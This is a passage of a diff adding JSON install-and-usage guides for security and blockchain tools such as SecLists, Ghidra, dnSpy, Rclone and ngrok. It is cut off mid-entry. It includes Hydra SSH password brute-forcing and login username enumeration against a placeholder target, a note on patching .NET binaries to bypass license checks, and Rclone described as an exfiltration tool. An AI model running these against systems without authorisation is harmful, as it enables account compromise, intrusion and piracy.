+          "title": "JSON Output and CI Integration",
+          "description": "Output results in JSON for automation and CI/CD pipelines.",
+          "commands": [
+            {
+              "label": "JSON output",
+              "command": "trufflehog git file://./ --json > results.json"
+            },
+            {
+              "label": "Fail CI on findings",
+              "command": "trufflehog git file://./ --fail --only-verified"
+            }
+          ],
+          "notes": "Use --fail with --only-verified in CI to block deployments only when actually live secrets are found. This avoids blocking on historical or revoked credentials."
+        }
+      ]
+    },
+    {
+      "slug": "bitcoin-cli",
+      "title": "How to Install and Use Bitcoin Core CLI",
+      "description": "This guide covers installing Bitcoin Core, syncing the blockchain, and using bitcoin-cli to query transactions, blocks, and addresses.",
+      "prerequisites": [
+        "500GB+ free disk space for full blockchain sync",
+        "Linux or macOS",
+        "Patience - initial sync takes hours to days"
+      ],
+      "steps": [
+        {
+          "title": "Install Bitcoin Core",
+          "description": "Download and install Bitcoin Core which includes both the daemon (bitcoind) and the CLI tool (bitcoin-cli).",
+          "commands": [
+            {
+              "label": "macOS",
+              "command": "brew install bitcoin"
+            },
+            {
+              "label": "Ubuntu",
+              "command": "sudo apt install snapd && sudo snap install bitcoin-core"
+            },
+            {
+              "label": "Verify",
+              "command": "bitcoin-cli --version"
+            }
+          ]
+        },
+        {
+          "title": "Start the Daemon",
+          "description": "Start bitcoind to begin syncing the blockchain. First sync takes a long time.",
+          "commands": [
+            {
+              "label": "Start daemon",
+              "command": "bitcoind -daemon"
+            },
+            {
+              "label": "Check sync progress",
+              "command": "bitcoin-cli getblockchaininfo | grep verificationprogress"
+            }
+          ],
+          "notes": "For investigations where you don't need the full blockchain locally, consider using -prune=10000 to keep only the most recent 10GB of blocks. Or use a public API for quick lookups."
+        },
+        {
+          "title": "Query Blockchain Info",
+          "description": "Once synced, query blocks, transactions, and network info.",
+          "commands": [
+            {
+              "label": "Current block height",
+              "command": "bitcoin-cli getblockcount"
+            },
+            {
+              "label": "Network info",
+              "command": "bitcoin-cli getnetworkinfo"
+            },
+            {
+              "label": "Get a block hash",
+              "command": "bitcoin-cli getblockhash 800000"
+            },
+            {
+              "label": "Get block details",
+              "command": "bitcoin-cli getblock $(bitcoin-cli getblockhash 800000)"
+            }
+          ]
+        },
+        {
+          "title": "Look Up Transactions",
+          "description": "Query specific transactions by their hash. This is the core of blockchain forensics - following the money.",
+          "commands": [
+            {
+              "label": "Get raw transaction",
+              "command": "bitcoin-cli getrawtransaction <txid> true"
+            },
+            {
+              "label": "Decode raw transaction",
+              "command": "bitcoin-cli decoderawtransaction <hex>"
+            }
+          ],
+          "notes": "The 'true' parameter on getrawtransaction returns decoded JSON instead of raw hex. You need -txindex=1 in your bitcoin.conf to look up arbitrary transactions (not just ones in your wallet)."
+        },
+        {
+          "title": "Wallet Operations (for Testing)",
+          "description": "Create a wallet and generate addresses for testing and research.",
+          "commands": [
+            {
+              "label": "Create wallet",
+              "command": "bitcoin-cli createwallet \"research\""
+            },
+            {
+              "label": "Generate address",
+              "command": "bitcoin-cli getnewaddress"
+            },
+            {
+              "label": "List wallets",
+              "command": "bitcoin-cli listwallets"
+            }
+          ],
+          "notes": "For forensic work you typically don't need a wallet - you're analyzing other people's transactions. But having a wallet is useful for understanding how the protocol works."
+        }
+      ]
+    },
+    {
+      "slug": "seclists",
+      "title": "How to Install and Use SecLists",
+      "description": "This guide covers downloading SecLists and using its wordlists with tools like ffuf, Gobuster, Hashcat, and Nuclei for effective security testing.",
+      "prerequisites": [
+        "A security testing tool that accepts wordlists (ffuf, gobuster, hashcat, etc.)"
+      ],
+      "steps": [
+        {
+          "title": "Install SecLists",
+          "description": "Download the SecLists collection. On Kali Linux it's pre-installed.",
+          "commands": [
+            {
+              "label": "Kali Linux (pre-installed)",
+              "command": "ls /usr/share/seclists/"
+            },
+            {
+              "label": "apt",
+              "command": "sudo apt install seclists"
+            },
+            {
+              "label": "Git clone",
+              "command": "git clone https://github.com/danielmiessler/SecLists.git ~/SecLists"
+            }
+          ],
+          "notes": "SecLists is about 1GB downloaded. It's a collection of wordlists, not a tool itself - you use these lists with other tools."
+        },
+        {
+          "title": "Directory Brute-Forcing",
+          "description": "Use SecLists' Discovery wordlists with ffuf or Gobuster to find hidden directories and files on web servers.",
+          "commands": [
+            {
+              "label": "ffuf with common list",
+              "command": "ffuf -u https://target.com/FUZZ -w ~/SecLists/Discovery/Web-Content/common.txt"
+            },
+            {
+              "label": "Gobuster with bigger list",
+              "command": "gobuster dir -u https://target.com -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+            },
+            {
+              "label": "API endpoint discovery",
+              "command": "ffuf -u https://target.com/api/FUZZ -w ~/SecLists/Discovery/Web-Content/api/api-endpoints.txt"
+            }
+          ],
+          "notes": "Start with common.txt (4,700 entries) for quick scans. Move to directory-list-2.3-medium.txt (220,000 entries) for thorough coverage. The API wordlists are gold for testing REST APIs."
+        },
+        {
+          "title": "Subdomain Enumeration",
+          "description": "Use DNS wordlists for subdomain brute-forcing.",
+          "commands": [
+            {
+              "label": "With ffuf",
+              "command": "ffuf -u https://FUZZ.target.com -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200"
+            },
+            {
+              "label": "With gobuster",
+              "command": "gobuster dns -d target.com -w ~/SecLists/Discovery/DNS/subdomains-top1million-20000.txt"
+            }
+          ]
+        },
+        {
+          "title": "Password Attacks",
+          "description": "SecLists includes curated password lists and username lists for credential testing.",
+          "commands": [
+            {
+              "label": "Common passwords with Hydra",
+              "command": "hydra -l admin -P ~/SecLists/Passwords/Common-Credentials/10k-most-common.txt target.com ssh"
+            },
+            {
+              "label": "Username enumeration",
+              "command": "ffuf -u https://target.com/login -X POST -d 'user=FUZZ&pass=test' -w ~/SecLists/Usernames/top-usernames-shortlist.txt -mc 200"
+            },
+            {
+              "label": "Default credentials",
+              "command": "cat ~/SecLists/Passwords/Default-Credentials/"
+            }
+          ],
+          "notes": "The Default-Credentials directory contains default username:password combos for hundreds of products - routers, databases, web apps. Check these first before brute-forcing."
+        },
+        {
+          "title": "What's Inside",
+          "description": "A quick tour of the most useful directories in SecLists.",
+          "commands": [
+            {
+              "label": "Browse the structure",
+              "command": "find ~/SecLists -maxdepth 2 -type d | head -30"
+            }
+          ],
+          "notes": "Key directories: Discovery/Web-Content/ (directory bruting), Discovery/DNS/ (subdomain lists), Passwords/ (credential lists), Fuzzing/ (injection payloads for XSS, SQLi, etc.), Usernames/ (username lists). The Fuzzing directory is especially useful for manual testing - it has payloads for every injection type."
+        }
+      ]
+    },
+    {
+      "slug": "ghidra",
+      "title": "How to Install and Use Ghidra",
+      "description": "This guide covers installing Ghidra, loading a binary, navigating the decompiler, and performing basic reverse engineering analysis.",
+      "prerequisites": [
+        "Java 17+ (JDK, not JRE)",
+        "A binary to analyze"
+      ],
+      "steps": [
+        {
+          "title": "Install Ghidra",
+          "description": "Download Ghidra from the official GitHub releases. It's a portable application - no installation required.",
+          "commands": [
+            {
+              "label": "Install Java first",
+              "command": "sudo apt install openjdk-17-jdk"
+            },
+            {
+              "label": "Download and extract",
+              "command": "wget https://github.com/NationalSecurityAgency/ghidra/releases/latest -O ghidra.zip && unzip ghidra.zip"
+            },
+            {
+              "label": "Launch Ghidra",
+              "command": "cd ghidra_* && ./ghidraRun"
+            }
+          ],
+          "notes": "Ghidra is developed by the NSA and released as open source. Despite the source, it's genuinely excellent and widely trusted by the security community."
+        },
+        {
+          "title": "Create a Project and Import a Binary",
+          "description": "Ghidra organizes work into projects. Create one, then import the binary you want to analyze.",
+          "commands": [
+            {
+              "label": "GUI steps",
+              "command": "# File > New Project > Non-Shared Project\n# Choose a directory and project name\n# File > Import File > Select your binary\n# Double-click the imported file to open in CodeBrowser"
+            }
+          ],
+          "notes": "Ghidra supports PE (Windows), ELF (Linux), Mach-O (macOS), APK, firmware images, and many other formats. It auto-detects the format and architecture."
+        },
+        {
+          "title": "Auto Analysis",
+          "description": "When you open a binary, Ghidra offers to run auto-analysis. Accept it - this identifies functions, strings, cross-references, and data types.",
+          "commands": [
+            {
+              "label": "GUI steps",
+              "command": "# Click 'Yes' when prompted for auto-analysis\n# Use default analysis options\n# Wait for analysis to complete (watch the progress bar)"
+            }
+          ],
+          "notes": "Auto-analysis can take a few minutes for large binaries. It's doing function identification, disassembly, decompilation prep, and string extraction. Let it finish before you start exploring."
+        },
+        {
+          "title": "Navigate the Decompiler",
+          "description": "The decompiler window shows C-like pseudocode for the selected function. This is Ghidra's killer feature.",
+          "commands": [
+            {
+              "label": "Key navigation",
+              "command": "# Click any function in the listing to see its decompiled code\n# Double-click function calls to follow them\n# Press 'G' to go to a specific address\n# Use Window > Defined Strings to find all strings\n# Right-click a function > Rename to give it a meaningful name"
+            }
+          ],
+          "notes": "Start with the Defined Strings window - searching for strings like 'password', 'error', 'http://', or 'key' often leads you straight to interesting functions. Renaming functions as you understand them makes the code progressively more readable."
+        },
+        {
+          "title": "Cross-References and Function Graphs",
+          "description": "Understand how functions relate to each other using cross-references and control flow graphs.",
+          "commands": [
+            {
+              "label": "Key features",
+              "command": "# Right-click any function/variable > References > Show References To\n# Window > Function Graph (visual control flow)\n# Window > Function Call Graph (who calls what)\n# Search > For Strings (find specific text in the binary)"
+            }
+          ],
+          "notes": "Cross-references (xrefs) answer 'who calls this function?' and 'where is this string used?' - these are your primary navigation tools when analyzing unknown binaries."
+        },
+        {
+          "title": "Scripting with Ghidra",
+          "description": "Ghidra has a built-in script manager for automating analysis tasks in Java or Python.",
+          "commands": [
+            {
+              "label": "Open script manager",
+              "command": "# Window > Script Manager\n# Browse existing scripts by category\n# Click the green play button to run a script\n# Or write your own in Java/Python (Jython)"
+            }
+          ],
+          "notes": "The built-in scripts include useful utilities like 'FindCrypt' (identifies crypto constants), 'SearchForStrings', and various deobfuscation helpers. The scripting API is well-documented in Ghidra's built-in help."
+        }
+      ]
+    },
+    {
+      "slug": "cyberchef",
+      "title": "How to Install and Use CyberChef",
+      "description": "This guide covers accessing CyberChef, building transformation recipes, and using it for common security analysis tasks like decoding, decryption, and data extraction.",
+      "prerequisites": [
+        "A web browser (that's it - CyberChef runs entirely in the browser)"
+      ],
+      "steps": [
+        {
+          "title": "Access CyberChef",
+          "description": "CyberChef runs in your browser. Use the hosted version or run it locally for sensitive data.",
+          "commands": [
+            {
+              "label": "Hosted version",
+              "command": "# Visit https://gchq.github.io/CyberChef/"
+            },
+            {
+              "label": "Run locally with Docker",
+              "command": "docker run -d -p 8000:8000 ghcr.io/gchq/cyberchef:latest\n# Then visit http://localhost:8000"
+            }
+          ],
+          "notes": "CyberChef runs entirely client-side - no data is sent to any server, even on the hosted version. But for sensitive investigation data, running locally is best practice."
+        },
+        {
+          "title": "Your First Recipe",
+          "description": "CyberChef works by chaining operations into a 'recipe'. Paste input on the left, drag operations into the recipe area, see output on the right.",
+          "commands": [
+            {
+              "label": "Decode Base64",
+              "command": "# 1. Paste Base64 text in the Input box\n# 2. Search for 'From Base64' in the Operations panel\n# 3. Drag it into the Recipe area\n# 4. Output appears automatically\n\n# Try it: paste 'SGVsbG8gV29ybGQ=' and apply From Base64"
+            }
+          ]
+        },
+        {
+          "title": "Chain Multiple Operations",
+          "description": "The real power is chaining operations. Data flows through each step in order.",
+          "commands": [
+            {
+              "label": "Base64 then hex decode",
+              "command": "# Recipe:\n# 1. From Base64\n# 2. From Hex\n\n# URL decode then Base64 decode:\n# 1. URL Decode\n# 2. From Base64"
+            },
+            {
+              "label": "Extract and decode",
+              "command": "# Recipe for extracting URLs from encoded data:\n# 1. From Base64\n# 2. Extract URLs"
+            }
+          ],
+          "notes": "Drag operations to reorder them. Each operation transforms the output of the previous one. You can disable individual steps by clicking the checkbox to debug your recipe."
+        },
+        {
+          "title": "Common Security Recipes",
+          "description": "Recipes you'll use regularly in security work.",
+          "commands": [
+            {
+              "label": "Decode XOR-encoded malware string",
+              "command": "# 1. From Hex\n# 2. XOR (set the key)\n# Output: decoded string"
+            },
+            {
+              "label": "Analyze JWT token",
+              "command": "# 1. Paste the JWT\n# 2. JWT Decode\n# Shows header, payload, and signature"
+            },
+            {
+              "label": "Hash identification",
+              "command": "# 1. Paste a hash\n# 2. Analyse hash\n# Suggests the hash type"
+            },
+            {
+              "label": "Extract IOCs from a report",
+              "command": "# 1. Paste text\n# 2. Extract IP addresses\n# 3. Sort\n# 4. Unique"
+            }
+          ]
+        },
+        {
+          "title": "The Magic Button",
+          "description": "CyberChef's Magic operation automatically detects encoding and suggests transformations. It's surprisingly good.",
+          "commands": [
+            {
+              "label": "Auto-detect encoding",
+              "command": "# 1. Paste encoded/encrypted data in Input\n# 2. Search for 'Magic' in Operations\n# 3. Drag it into Recipe\n# 4. CyberChef suggests what encoding it is and how to decode it"
+            }
+          ],
+          "notes": "Magic works by trying common transformations and checking if the output looks like readable text. It can chain multiple steps automatically - sometimes revealing Base64-within-URL-encoding-within-hex patterns you wouldn't spot manually."
+        }
+      ]
+    },
+    {
+      "slug": "rclone",
+      "title": "How to Install and Use Rclone",
+      "description": "This guide covers installing Rclone and using it to sync, copy, and mount cloud storage from 70+ providers including S3, Google Drive, and Azure Blob.",
+      "prerequisites": [
+        "Linux, macOS, or Windows"
+      ],
+      "steps": [
+        {
+          "title": "Install Rclone",
+          "description": "Install Rclone from your package manager or the official script.",
+          "commands": [
+            {
+              "label": "Official installer",
+              "command": "curl https://rclone.org/install.sh | sudo bash"
+            },
+            {
+              "label": "macOS",
+              "command": "brew install rclone"
+            },
+            {
+              "label": "Verify",
+              "command": "rclone version"
+            }
+          ]
+        },
+        {
+          "title": "Configure a Remote",
+          "description": "Set up a connection to a cloud storage provider. The interactive config walks you through it.",
+          "commands": [
+            {
+              "label": "Interactive setup",
+              "command": "rclone config"
+            },
+            {
+              "label": "List configured remotes",
+              "command": "rclone listremotes"
+            }
+          ],
+          "notes": "Follow the prompts to set up S3, Google Drive, Dropbox, SFTP, or any of 70+ supported providers. Each remote gets a name you'll reference in commands."
+        },
+        {
+          "title": "Basic Operations",
+          "description": "Copy, sync, and list files on your configured remotes.",
+          "commands": [
+            {
+              "label": "List files",
+              "command": "rclone ls remote:bucket/path"
+            },
+            {
+              "label": "Copy files",
+              "command": "rclone copy /local/path remote:bucket/path"
+            },
+            {
+              "label": "Sync (mirror)",
+              "command": "rclone sync /local/path remote:bucket/path"
+            },
+            {
+              "label": "Move files",
+              "command": "rclone move /local/path remote:bucket/path"
+            }
+          ],
+          "notes": "sync makes the destination match the source exactly - it will delete files at the destination that don't exist at the source. Use copy if you don't want deletions."
+        },
+        {
+          "title": "Mount as Filesystem",
+          "description": "Mount a remote as a local filesystem. Access cloud storage like a local folder.",
+          "commands": [
+            {
+              "label": "Mount",
+              "command": "rclone mount remote:bucket /mnt/cloud --daemon"
+            },
+            {
+              "label": "Unmount",
+              "command": "fusermount -u /mnt/cloud"
+            }
+          ],
+          "notes": "Mounting is great for browsing cloud storage with normal file tools. Performance depends on your connection speed."
+        },
+        {
+          "title": "Security-Relevant Usage",
+          "description": "Rclone is commonly used for data exfiltration simulation in pentests and for forensic evidence collection from cloud storage.",
+          "commands": [
+            {
+              "label": "Encrypted remote",
+              "command": "# During rclone config, choose 'crypt' as the remote type\n# This adds client-side encryption to any other remote"
+            },
+            {
+              "label": "Bandwidth limiting",
+              "command": "rclone copy remote:bucket /local --bwlimit 1M"
+            }
+          ],
+          "notes": "In red team contexts, rclone's ability to sync to attacker-controlled cloud storage makes it a common exfiltration tool. Defenders should monitor for rclone.exe and its network signatures."
+        }
+      ]
+    },
+    {
+      "slug": "go-ethereum",
+      "title": "How to Install and Use Geth",
+      "description": "This guide covers installing Geth (Go Ethereum), syncing the Ethereum blockchain, and querying accounts, transactions, and smart contracts.",
+      "prerequisites": [
+        "100GB+ disk space (snap sync)",
+        "Linux or macOS",
+        "Stable internet connection"
+      ],
+      "steps": [
+        {
+          "title": "Install Geth",
+          "description": "Install Geth from package manager or download the binary.",
+          "commands": [
+            {
+              "label": "macOS",
+              "command": "brew install ethereum"
+            },
+            {
+              "label": "Ubuntu PPA",
+              "command": "sudo add-apt-repository -y ppa:ethereum/ethereum && sudo apt update && sudo apt install geth"
+            },
+            {
+              "label": "Verify",
+              "command": "geth version"
+            }
+          ]
+        },
+        {
+          "title": "Start Syncing",
+          "description": "Start Geth in snap sync mode (fastest way to get a usable node).",
+          "commands": [
+            {
+              "label": "Start with snap sync",
+              "command": "geth --syncmode snap --http --http.api eth,net,web3"
+            },
+            {
+              "label": "Check sync progress",
+              "command": "geth attach --exec 'eth.syncing'"
+            }
+          ],
+          "notes": "Snap sync downloads block headers and state data in parallel. It's much faster than full sync. The --http flags enable the JSON-RPC API for querying."
+        },
+        {
+          "title": "Query the Blockchain",
+          "description": "Use the Geth JavaScript console to query accounts, balances, and transactions.",
+          "commands": [
+            {
+              "label": "Attach to running node",
+              "command": "geth attach"
+            },
+            {
+              "label": "Check balance (in Wei)",
+              "command": "eth.getBalance('0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045')"
+            },
+            {
+              "label": "Get transaction details",
+              "command": "eth.getTransaction('0xTXHASH')"
+            },
+            {
+              "label": "Get latest block",
+              "command": "eth.getBlock('latest')"
+            }
+          ],
+          "notes": "Balances are returned in Wei (1 ETH = 10^18 Wei). Use web3.fromWei(balance, 'ether') to convert."
+        },
+        {
+          "title": "JSON-RPC API",
+          "description": "Query Geth programmatically via the HTTP JSON-RPC API.",
+          "commands": [
+            {
+              "label": "Get balance via curl",
+              "command": "curl -X POST http://localhost:8545 -H 'Content-Type: application/json' -d '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBalance\",\"params\":[\"0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045\",\"latest\"],\"id\":1}'"
+            },
+            {
+              "label": "Get block number",
+              "command": "curl -X POST http://localhost:8545 -H 'Content-Type: application/json' -d '{\"jsonrpc\":\"2.0\",\"method\":\"eth_blockNumber\",\"params\":[],\"id\":1}'"
+            }
+          ],
+          "notes": "The JSON-RPC API is how most tools (Ethers.js, Web3.py, Cast) communicate with Geth. Running your own node means you're not dependent on Infura or Alchemy rate limits."
+        }
+      ]
+    },
+    {
+      "slug": "x64dbg",
+      "title": "How to Install and Use x64dbg",
+      "description": "This guide covers installing x64dbg on Windows and using it for basic binary debugging, breakpoints, and malware analysis.",
+      "prerequisites": [
+        "Windows 7+ (64-bit)",
+        "A binary to analyze"
+      ],
+      "steps": [
+        {
+          "title": "Install x64dbg",
+          "description": "Download and extract x64dbg. It's portable - no installer needed.",
+          "commands": [
+            {
+              "label": "Download",
+              "command": "# Download latest snapshot from https://x64dbg.com\n# Extract the zip to a folder like C:\\x64dbg\n# Run x96dbg.exe (launcher that picks 32 or 64-bit)"
+            },
+            {
+              "label": "Or via Chocolatey",
+              "command": "choco install x64dbg.portable"
+            }
+          ],
+          "notes": "x96dbg.exe is the launcher that auto-selects x32dbg or x64dbg based on the target binary's architecture."
+        },
+        {
+          "title": "Load a Binary",
+          "description": "Open a binary for debugging. x64dbg pauses at the system entry point.",
+          "commands": [
+            {
+              "label": "GUI",
+              "command": "# File > Open > Select your executable\n# The debugger pauses at ntdll entry point\n# Press F9 (Run) to reach the application entry point"
+            }
+          ]
+        },
+        {
+          "title": "Set Breakpoints",
+          "description": "Breakpoints pause execution so you can inspect the program's state at critical points.",
+          "commands": [
+            {
+              "label": "Key commands",
+              "command": "# F2 - Toggle breakpoint at current line\n# Ctrl+G - Go to address\n# F7 - Step into (follow function calls)\n# F8 - Step over (execute call, stop at next line)\n# F9 - Run until next breakpoint"
+            }
+          ],
+          "notes": "For malware analysis, set breakpoints on API calls like CreateFile, WriteFile, RegSetValue, connect, and send to understand what the malware does."
+        },
+        {
+          "title": "Inspect Memory and Registers",
+          "description": "View register values, memory contents, and the stack while debugging.",
+          "commands": [
+            {
+              "label": "Key windows",
+              "command": "# CPU tab - Disassembly, registers, stack, memory dump\n# Memory Map tab - See all loaded modules and memory regions\n# Handles tab - Open file handles, registry keys, network sockets\n# Strings tab - Right-click module > Search for > All strings"
+            }
+          ]
+        },
+        {
+          "title": "Useful Plugins",
+          "description": "x64dbg has a plugin ecosystem. A few essentials for security work.",
+          "commands": [
+            {
+              "label": "Essential plugins",
+              "command": "# ScyllaHide - Anti-anti-debug (hides debugger from detection)\n# x64dbgpy - Python scripting support\n# Swiss Army Knife - Collection of useful utilities\n# SharpOD - Another anti-debug plugin\n\n# Install: drop DLLs into x64dbg/release/x32/plugins/ or x64/plugins/"
+            }
+          ],
+          "notes": "Malware commonly checks for debuggers using IsDebuggerPresent, NtQueryInformationProcess, and timing checks. ScyllaHide patches these so the malware doesn't know it's being analyzed."
+        }
+      ]
+    },
+    {
+      "slug": "jadx",
+      "title": "How to Install and Use JADX",
+      "description": "This guide covers installing JADX and using it to decompile Android APK files back to readable Java source code.",
+      "prerequisites": [
+        "Java 11+",
+        "An APK file to analyze"
+      ],
+      "steps": [
+        {
+          "title": "Install JADX",
+          "description": "Download JADX from GitHub releases or install via package manager.",
+          "commands": [
+            {
+              "label": "macOS",
+              "command": "brew install jadx"
+            },
+            {
+              "label": "Download",
+              "command": "# Download latest from https://github.com/skylot/jadx/releases\n# Extract and run bin/jadx-gui"
+            },
+            {
+              "label": "Verify CLI",
+              "command": "jadx --version"
+            }
+          ]
+        },
+        {
+          "title": "Open an APK in the GUI",
+          "description": "Launch the GUI and load an APK file for visual exploration.",
+          "commands": [
+            {
+              "label": "Launch GUI",
+              "command": "jadx-gui"
+            },
+            {
+              "label": "Then",
+              "command": "# File > Open > Select your .apk file\n# Wait for decompilation\n# Browse the source tree on the left"
+            }
+          ],
+          "notes": "JADX decompiles DEX bytecode back to Java source. The output isn't perfect but it's usually very readable. You can also open .dex, .jar, and .class files."
+        },
+        {
+          "title": "Command-Line Decompilation",
+          "description": "Decompile an APK to a directory of Java source files from the command line.",
+          "commands": [
+            {
+              "label": "Decompile to directory",
+              "command": "jadx -d output/ target.apk"
+            },
+            {
+              "label": "With resource decoding",
+              "command": "jadx -d output/ --show-bad-code target.apk"
+            }
+          ],
+          "notes": "The --show-bad-code flag includes methods that couldn't be fully decompiled, showing the bytecode as comments. This is useful when analyzing obfuscated apps."
+        },
+        {
+          "title": "Search and Navigate",
+          "description": "Find interesting code in the decompiled output.",
+          "commands": [
+            {
+              "label": "GUI search",
+              "command": "# Navigation > Text Search (Ctrl+Shift+F)\n# Search for: 'http://', 'api_key', 'password', 'secret'\n# Navigation > Class Search (Ctrl+N) to find specific classes"
+            },
+            {
+              "label": "CLI search",
+              "command": "jadx -d output/ target.apk && grep -r 'api_key\\|secret\\|password' output/"
+            }
+          ],
+          "notes": "Start by searching for URLs, API keys, hardcoded credentials, and encryption keys. Many Android apps contain secrets in their source that developers assumed wouldn't be accessible."
+        },
+        {
+          "title": "Export for Further Analysis",
+          "description": "Export the decompiled source and resources for deeper analysis.",
+          "commands": [
+            {
+              "label": "Export as Gradle project",
+              "command": "jadx -d output/ --export-gradle target.apk"
+            }
+          ],
+          "notes": "Exporting as a Gradle project lets you open the decompiled app in Android Studio for a full IDE experience with code navigation, search, and refactoring tools."
+        }
+      ]
+    },
+    {
+      "slug": "dnspy",
+      "title": "How to Install and Use dnSpy",
+      "description": "This guide covers installing dnSpy on Windows and using it to decompile, debug, and modify .NET assemblies.",
+      "prerequisites": [
+        "Windows",
+        "A .NET executable or DLL to analyze"
+      ],
+      "steps": [
+        {
+          "title": "Install dnSpy",
+          "description": "Download dnSpy from GitHub releases. It's portable - no installer.",
+          "commands": [
+            {
+              "label": "Download",
+              "command": "# Download latest from https://github.com/dnSpy/dnSpy/releases\n# Extract zip\n# Run dnSpy.exe"
+            },
+            {
+              "label": "Or via Chocolatey",
+              "command": "choco install dnspy"
+            }
+          ],
+          "notes": "The original repo is archived but the tool still works perfectly. Several community forks continue development."
+        },
+        {
+          "title": "Load and Decompile",
+          "description": "Open a .NET assembly and browse the decompiled C# source code.",
+          "commands": [
+            {
+              "label": "GUI steps",
+              "command": "# File > Open > Select .exe or .dll\n# Assembly tree appears on the left\n# Click any class/method to see decompiled C# code\n# Right-click > Go to Entry Point to find main()"
+            }
+          ],
+          "notes": "dnSpy produces very clean C# output from compiled .NET assemblies. Variable names, method signatures, and string literals are all preserved because .NET metadata is rich."
+        },
+        {
+          "title": "Debug Without Source",
+          "description": "Set breakpoints and debug .NET applications without having the source code. This is dnSpy's killer feature.",
+          "commands": [
+            {
+              "label": "Debug steps",
+              "command": "# Debug > Start Debugging (F5) to launch the exe under debugger\n# Or Debug > Attach to Process for running applications\n# Click in the margin to set breakpoints\n# F10 = Step Over, F11 = Step Into\n# Locals/Watch windows show variable values"
+            }
+          ]
+        },
+        {
+          "title": "Edit and Patch",
+          "description": "Modify IL code or C# directly and save the patched assembly.",
+          "commands": [
+            {
+              "label": "Edit steps",
+              "command": "# Right-click a method > Edit Method Body (IL)\n# Or Right-click a method > Edit Method (C#)\n# Make changes in the editor\n# File > Save Module to write the patched assembly"
+            }
+          ],
+          "notes": "You can change string comparisons, bypass license checks, modify return values, or add logging. Save creates a new patched binary."
+        },
+        {
+          "title": "Search Across Assemblies",
+          "description": "Search for strings, types, methods, and references across loaded assemblies.",
+          "commands": [
+            {
+              "label": "Search features",
+              "command": "# Edit > Search Assemblies (Ctrl+Shift+K)\n# Search for: passwords, API keys, crypto operations\n# Analyze tab shows cross-references (who calls this method?)"
+            }
+          ],
+          "notes": "For malware analysis, search for crypto-related classes (AES, RSA), network classes (HttpClient, Socket), and file operations (File.Write, Registry). These reveal the malware's capabilities quickly."
+        }
+      ]
+    },
+    {
+      "slug": "ilspy",
+      "title": "How to Install and Use ILSpy",
+      "description": "This guide covers installing ILSpy and using it to decompile .NET assemblies to readable C# source code across all platforms.",
+      "prerequisites": [
+        ".NET Runtime (for CLI tool) or Windows (for GUI)"
+      ],
+      "steps": [
+        {
+          "title": "Install ILSpy",
+          "description": "ILSpy is available as a Windows GUI, VS Code extension, and cross-platform CLI tool.",
+          "commands": [
+            {
+              "label": "CLI (cross-platform)",
+              "command": "dotnet tool install ilspycmd -g"
+            },
+            {
+              "label": "Verify",
+              "command": "ilspycmd --version"
+            },
+            {
+              "label": "Windows GUI",
+              "command": "choco install ilspy"
+            }
+          ]
+        },
+        {
+          "title": "Decompile via CLI",
+          "description": "Decompile a .NET assembly to C# source files from the command line.",
+          "commands": [
+            {
+              "label": "Decompile to directory",
+              "command": "ilspycmd -p -o output/ target.dll"
+            },
+            {
+              "label": "Decompile single type",
+              "command": "ilspycmd target.dll -t Namespace.ClassName"
+            }
+          ]
+        },
+        {
+          "title": "GUI Navigation",
+          "description": "Open assemblies in the GUI and browse decompiled code.",
+          "commands": [
+            {
+              "label": "GUI steps",
+              "command": "# File > Open > Select assembly\n# Browse namespaces and types in the tree\n# Click any type/method to see decompiled C#\n# View > IL Code to see intermediate language alongside C#"
+            }
+          ]
+        },
+        {
+          "title": "Search and Analyze",
+          "description": "Find specific code patterns across loaded assemblies.",
+          "commands": [
+            {
+              "label": "Search",
+              "command": "# Edit > Search (F3)\n# Search types, members, or constants\n# Analyze window (Ctrl+R) shows 'Used By' and 'Uses' for any member"
+            }
+          ],
+          "notes": "ILSpy focuses on decompilation quality. If you need debugging, use dnSpy instead. If you need cross-platform CLI decompilation, ILSpy is the better choice."
+        }
+      ]
+    },
+    {
+      "slug": "ngrok",
+      "title": "How to Install and Use ngrok",
+      "description": "This guide covers installing ngrok and using it to expose local services to the internet for testing, webhooks, and demonstrations.",
+      "prerequisites": [
+        "A free ngrok account (sign up at ngrok.com)"
+      ],
+      "steps": [
+        {
+          "title": "Install and Authenticate",
+          "description": "Install ngrok and add your auth token.",
+          "commands": [
+            {
+              "label": "macOS",
+              "command": "brew install ngrok"
+            },
+            {
+              "label": "Linux",
+              "command": "curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo 'deb https://ngrok-agent.s3.amazonaws.com buster main' | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok"
+            },
+            {
+              "label": "Add auth token",
+              "command": "ngrok config add-authtoken YOUR_TOKEN_HERE"
+            }
+          ]
+        },
+        {
+          "title": "Expose a Local Web Server",
+          "description": "Create a public URL that tunnels to a local port.",
+          "commands": [
+            {
+              "label": "HTTP tunnel",
+              "command": "ngrok http 3000"
+            },
+            {
+              "label": "With custom domain (paid)",
+              "command": "ngrok http --domain=myapp.ngrok.dev 3000"
+            }
+          ],
+          "output": "Session Status: online\nForwarding: https://abc123.ngrok-free.app -> http://localhost:3000",
+          "notes": "The forwarding URL is publicly accessible. Anyone with the URL can reach your local server. The URL changes each time unless you have a paid plan with reserved domains."
+        },
+        {
+          "title": "Expose Other Protocols",
+          "description": "ngrok supports TCP tunnels for SSH, databases, and other non-HTTP services.",
+          "commands": [
+            {
+              "label": "TCP tunnel (SSH)",
+              "command": "ngrok tcp 22"
+            },
+            {
+              "label": "TLS tunnel",
+              "command": "ngrok tls 443"
+            }
+          ]
+        },
+        {
+          "title": "Inspect Traffic",
+          "description": "ngrok's built-in inspector shows all requests passing through the tunnel.",
+          "commands": [
+            {
+              "label": "Web inspector",
+              "command": "# Visit http://localhost:4040 while ngrok is running\n# See all requests, headers, bodies, and responses\n# Replay requests to test changes"
+            }
+          ],
+          "notes": "The traffic inspector at localhost:4040 is incredibly useful for debugging webhooks. You can see exactly what the remote service is sending and replay requests without triggering the webhook again."
+        },
+        {
+          "title": "Security Considerations",
+          "description": "ngrok is a dual-use tool. Understand the risks.",
+          "commands": [
+            {
+              "label": "Add basic auth",
+              "command": "ngrok http 3000 --basic-auth='user:password'"
+            },
+            {
+              "label": "IP restrictions",
